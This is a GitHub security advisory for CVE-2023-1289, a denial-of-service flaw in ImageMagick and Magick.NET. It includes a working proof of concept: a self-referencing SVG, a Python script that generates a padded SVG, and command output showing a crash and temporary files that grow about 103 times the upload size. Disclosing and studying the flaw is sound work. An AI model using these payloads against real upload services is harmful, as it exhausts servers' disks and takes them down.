# [M] ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in "/tmp", possible to leverage DoS

## Summary
Severity: Medium
Advisory: GHSA-j96m-mjp6-99xr
CVE: CVE-2023-1289
CWE: CWE-20, CWE-400
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-j96m-mjp6-99xr
Type: github-advisory

## Affected
- NuGet: `Magick.NET-Q16-AnyCPU` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-HDRI-AnyCPU` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-HDRI-OpenMP-arm64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-HDRI-arm64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-HDRI-x64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-HDRI-x86` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-OpenMP-arm64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-OpenMP-x64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-OpenMP-x86` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-arm64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-x64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-x86` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q16-HDRI-OpenMP-x64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q8-AnyCPU` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q8-OpenMP-arm64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q8-OpenMP-x64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q8-arm64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q8-x64` — affected >=0 <13.0.0
- NuGet: `Magick.NET-Q8-x86` — affected >=0 <13.0.0

## Details
### Summary
Specially crafted SVG file make segmentation fault and generate trash files in "/tmp", possible to leverage DoS.

### Operating system, version and so on

Linux,  Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara)

### Tested ImageMagick version

6.9.11-60, 7.1.0-62

### Details
A specially created SVG file that loads by itself and make segmentation fault. Remote attackers can take advantage of this vulnerability to cause a denial of service of the generated SVG file.

It seems that this error affects a lot of websites and causes a generating trash files in ```/tmp``` when uploading this PC file to the server.

I think it's better to check the file descriptor coming from itself before executing ```read()```.

### PoC
1. Generate SVG file:
```<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<image height="200" width="200" xlink:href="bad.svg" />
</svg>
```
2. Run some commands for verification:
```$rm -f /tmp/*
$./magick --version
Version: ImageMagick 7.1.0-62 Q16-HDRI x86_64 74b3683a4:20230211 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
$./magick convert -verbose -font OpenSymbol bad.svg t.jpg
'inkscape' '/tmp/magick-ixX13JwrwrLUhyucKsGxechsQtEN4Zji' --export-filename='/tmp/magick-qp154V6U-dyAwtU-QbcnWD8XKFcG7q5k.png' --export-dpi='96' --export-background='rgb(100%,100%,100%)' --export-background-opacity='1' > '/tmp/magick-YWdlPJt-_9BfRq0uY2vmza_VOxWfjyvl' 2>&1
Segmentation fault
$ls /tmp
magick-1iZstE-dzlzQTN4HkWX_JlakXXtH4IEM  magick-GeFwj8Be_wISDLJnsr4s5WC7p079pzXN  magick-s7QN2tTaiXEr9KmkbkHdmtfmgrnjFRaM
magick-1LG0ND-RZMQOG8xizDHd-qdd6_Fu70YP  magick-ggORXwnSivWesH2gthhafuLTVw7TLqwP  magick-s835rBXZIGK5bkp3ijKoMTCbcyWza3ON
magick-25byX_oEeEr2dWIkr9nyEoVz1MHC2n9M  magick-GrRg60fY1LOv4uUhqD16AaEcL6rWtNeN  magick-siS7QS_av31X63ENYmecytIjx1iKmWAN
magick-2Dj7LuLUHF6Y93mZ9ZT8a5taf7b5Hb9O  magick-gTQUBafZIaI1n8q-QXOwOvyc6qv3tolN  magick-SIXvVjWVvDhX1w5NL9K6owJtO0CgG3NN
magick-2GrJuPlQjwGwsTK8I1aTMxg90h8PeK4M  magick-hik3AU_2x0D_R8ViIBXUIuRljCXSmgqO  magick-sJhO2Yv_aeKsxt1JxDENKIiQqkOkSfwM
magick-2QIFnR9e-fYRFevd1-vQ-bSk0I1VOAsO  magick-HJ18uyG3HLvEftNcMqCEJ5LKwi12CQgO  magick-SNgGdhyKjp5TZZQmWqioLEcyQ8vMzG3O
magick-2rEueYW0PIXGxE1zHm3LsGedMW2KLdgP  magick-hUaNDJgYfzTzJes4QlnLwaYh2fcaOWgQ  magick-SxLBCSdKVHSQOrjohe4WFyLHaPOyDUiP
magick-2uRqbAjqkXXMMGQHpw8WG18lnDHaRd3N  magick-_HWqrSdj_ihWMzjJ_eRiAkKbgrIljhUM  magick-t02HQvZSsYLzmJesC2Mpjp5OL3zN4A5P
magick-3dPT4h0HzM6ZqCwpGEB69e27pZhHbfHP  magick-iEMFbMc2VvGj067miVskUC-mxOveGpqO  magick-T4kTJGu-6wF60OOIHOB5tKO63NW5qTTL
magick-3SVSiI4Yg_eQ01ZZV8lZsBM_MhauuwpO  magick-InCjmKQ7uSGizlJFOZz9Vo3Ax1yvLy5L  magick-TGIY7l3-dNVdAbGaMIbN0z3YGy5mrNvM
magick-3WQIQghdu9-YHVasNASfkkU63yyVdmfO  magick-IPu9YWX3Lk96EkP63KLqQ-CX6020cZMN  magick-Thg6M-CqdcXc0SyjRdYm19rtVBLt2U6P
magick-4hLf4JPIes67QpGP7GfmOPftGvENC1aN  magick-IVKuPYBpBe6Lx9F3lLMAMCjIptMoz0ZM  magick-TiTtPZdT3Zgsd-pasyRFTb-DbLGNqJTO
magick-4tTMAJrCHh2E8M1xw5BIjx8UDyb42FWM  magick-IVzovwQiOR2fwJDO5E5RZb58apCPBX8M  magick-_TQZIwyyLufZWMVx1-k3YLSYSsGl6upM
magick-4xs5mqt95PYGrXXxZiwyYHFKREC0NEWL  magick-J36psEABfkKfgVQdeFsptbkRWT0b1uNP  magick-tzMg0NWi-_GQOzES2aPMPRqCk-bgjyVN
magick-5DmloHI-m-WPROyfQmm5cF8GOEVa5EqO  magick-jEq-Q6t6D3CU-eevjhgfjU_LPP3pOEoO  magick-ULNarZD53mUqpJrHZVeZw5x0cuUH683N
magick-5JvQUY2vVq_kpzhfUTcsxao_YB2WImZN  magick-jNiokVz_0Iifz5QX3a9AUIUOBoxfJ49P  magick-uLR13qPG6X-c3avLRypLJ-C7-UiUH9tM
magick-5NoXNg55Xyh8816ksKEcqreuN1BF93LO  magick-jwa4IVvrxrE4OTSA0m8iB2W3K5LiinmQ  magick-uW9khwJZfM4EH1cETVDv09QnueONQGPP
magick-60BRKi88--TOk-Sp8t5nAyAxjSuOpxfO  magick-K5mhLUCkx0WJxcWr7G7oT0nNrc5qBvgQ  magick-v4l3nLHBXBjCNc-nTHSTwUOEfsNCUMnP
magick-6t2qB_JnplYLZZo5thj6PV0R15LrPe4L  magick-K5qzx3k8-36H5wfEgl3Jy1oNpOyscHhN  magick-v7Xm_e5JIf4lCC_CwXJkIuQNHEE7D1LM
magick-6_UmuyWO8OviaajA92_VeD1bK8z0btAO  magick-K6-l4o2PkC4V7Nq_IJ9y-ifJLl6lSzdM  magick-vd7xpM8OrXvu3Oftqd7xdRmGDdoGcHrP
magick-725dkkTfpkfKmogI4WLWWwCbrxc0aysP  magick-KchLIwf4-ahsUq1FsJfK58j3Jb6CAMTP  magick-VhfNmWGF-AOhytm1DMGG8n1DLOAG3p1N
magick-7rZG_PFyH2Q7ibxFrB4kTQZjkihhU9uO  magick-kpcUuOTI4UlrK8kHoZh38ziLMmBjtjvO  magick-vHp_Pz6BixbqmYCq_D2zs2sU4hFRbQoP
magick--7T1tmKSEJSSPJIgeDEQ9PLdo8oPh60P  magick-kReWGvubeCrLdw4RcRsJdJhlV43wCffM  magick-VLoWnTJppgO7-ivh0q_uuGcgPDkuyKPN
magick-8jBguKQr6qeZTsw4eFbQWO34ndlsBpbO  magick-LBjQNSTFFpLRnj3Cldvjm5e_PWYL1fLL  magick-Vp_vOIJK-XsFRZeAS1ZJ9Ra2vkgJbCOL
magick-9Hno6LBapbL0jw_CSEC7Ua6A7kB3uYiN  magick-Lfu-5C1697AwNxTZnljfR24E2_7ZDnwP  magick-VpzT9KMjKbomi6mV3ZnnRkoq1WAP41vM
magick-9SN2401usIEYCc6zcn442pdvqyVdPWaQ  magick-lHxUfKDHYSfpVi7yOc31u7gJVTXLhSuN  magick-vRG2_rcf6I8lB2MJF6DqHqh2_z21IP5N
magick-a1uVHLsbEnA8yXKvwmW3PWAFBdnfoSnQ  magick-M4mcsykxHPNkFTDgc4tdJ9kP1Trkm64M  magick-vw2VNrClFVhnXLqVoIz35Xpo232qsngN
magick-AbpJUZcspor3bkYr70l17bGSjntyAhZP  magick-m5P0dZWaFUeZo4kr8HcO6vpfuICmmBcM  magick-WEYdL0amRHxeCpuGiFEuulRwwzkjZyXO
magick-Acsy_QEmT-x7nE6DvfIv2pqjLbfJYTtN  magick-MHI0zAFGR1-ljbFLl12i5hFVpkoBbdpN  magick-WKjEe_jTF4V6Jt_kCbFEy2B6kQcyFseQ
magick-Ai76_QfTBT0DXjGqvZ_aAGia_gvAxuGM  magick-mOckd_uEYCLc9gy1XwVgtJWpr1aDU7QP  magick-WkkwqgsnNNSleWlRm-1BN8RiE-QcF9lO
magick-albf_l7tU2ASh6PRhnMWBDscz31fS1BO  magick-MrajCpsti_3MlAWlNviDCY3iUeZsgGLM  magick-WMlxV7rdjtMYe1F0aggQZW2WNpvhY2GO
magick-A-nsLcvOOBlHzdBGQMSsdTrvsfUevEQO  magick-mZyca0hC8atGLvY-m0UYec1yCU3rGIWM  magick-wnqAodNT7ZVbe8dIN-Gd2pxCNo6cwzOL
magick-AplCAOC7_K6cDM3qO3wqSONMhVuztohO  magick-NAH0CgD3XCLMS1VN_-4yju-2RCdFJbGO  magick-wP3Q3aM05wB2K6NBolzm6sC_R3b5wE1P
magick-ApNw8tmuaXUw-mqdMF7P0ZKOV3YHwQGM  magick-NU3oGX5NxUhJvWQ_WWY8-7BNAnHWJceM  magick-wsCa-R-K6HYtZ7FWWnPg3FpOyGmS1wuO
magick-AWye85xaEc_t6rGB9bIvIz9BBhrRyg3O  magick-NZBKgJGx7bH8uZ2PiKF8jtzCI9aBDVZN  magick-WvNjMMQ2gXHSGNWCMceMqBL8ksnGZIuO
magick-aXtmFaHIdz24xjFvCy4ZQda2wef0AH0N  magick-o3FerPGSptnb0U5mHu6DH-00ZTlTlDCO  magick-xAPfisi5E9NHJKbkrbCGioXCkTs3uDYM
magick-B5uiXH3Mrf0GgmF9NAPwqSJd-lMFLfrM  magick-o4Dl5iYn3veI54-lNtHgm6wnAIQ79urP  magick-Xb2irJZuxzYWsCfmYHc8oaKU67ANR27N
magick-BEr6_VZecWKFCRVuSXPEIbJu6uuBe0pO  magick-o9S5taGlSrED8zUEtv0EkpjoWk61fJBO  magick-Xkes-Q_QqXhMthGwFKxLjpRvL96qRd6O
magick-bKCtVcSkQqtXdjO8X_AyWeocMsYuZArN  magick-OeHngPf0pRuDH9DpIs_OpkoAbDnAvBTL  magick-xlhsal9kyY6QMOSb1WmyTx1vGTqE94bO
magick-Btw2-hfTAVQLiPRMXakrXs_UhstT2ZGM  magick-OhD82cIFbY91zGxpIt52AbjWekddAU2L  magick-xmmr39PvOExl0B8w0YO_oq2_yYyWoVLM
magick-By2_pnDUxk85bO3M7kkMbAEXHGShyc0O  magick-OlcHbZjE_-66xMyWVlhfAucxYJioiQ4L  magick-xq9qw9wK-TRFokBTostne36jQXljCa7M
...
```

### Impact
Possible DOS, because when ImageMagick crashes it generates a lot of trash files. This trash file can be large, if SVG file contains many render action.

### Additional impact
In DOS attack if remount attacker uploads an SVG file of size t, ImageMagick generates files of size 103*t. This means that if an attacker uploads a 100 M SVG, the server will generate about 10 G.

Example:
```
$cat dos_poc.py 
open("bad_dos.svg", "w").write("""<?xml version="1.0"?>
<?xml-stylesheet href="https://example.com/style.xsl" type="text/xsl" ?>
<!DOCTYPE test>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<image height="200" width="200" href="bad_dos.svg&quot;""" + "0"*(1024*1021) +  """&quot;" />
</svg>""")
$rm -rf /tmp/magick-*
$python3 dos_poc.py
$du -h bad_dos.svg
1,0M	bad_dos.svg
$../magick convert -font OpenSymbol bad_dos.svg t.jpg 
Segmentation fault
$cat /tmp/magick-* > dos_k.txt
$du -h dos_k.txt 
103M	dos_k.txt
```

P. S. If ImageMagick will work in Docker container this attack will crash server where docker running. Because the size of the docker container will increase.

## References
- https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j96m-mjp6-99xr
- https://nvd.nist.gov/vuln/detail/CVE-2023-1289
- https://github.com/ImageMagick/ImageMagick/commit/c5b23cbf2119540725e6dc81f4deb25798ead6a4
- https://bugzilla.redhat.com/show_bug.cgi?id=2176858
- https://github.com/ImageMagick/ImageMagick
- https://lists.debian.org/debian-lts-announce/2024/02/msg00007.html
